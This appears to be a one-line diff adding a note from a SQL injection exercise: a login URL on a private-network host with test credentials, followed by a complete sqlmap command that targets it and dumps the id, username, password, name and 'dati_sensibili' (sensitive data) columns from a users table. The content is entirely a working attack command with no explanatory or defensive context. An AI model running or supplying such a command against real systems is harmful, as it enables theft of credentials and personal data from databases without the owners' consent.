@@ -1,0 +1,1 @@
+http://192.168.1.29/safe_login.php?username=test&password=test (GET)  # /usr/bin/sqlmap -u " http://192.168.1.29/safe_login.php?username=test&password=test" -D user_db -T users -C "id, username, password, cognome, nome, dati_sensibili" --dump
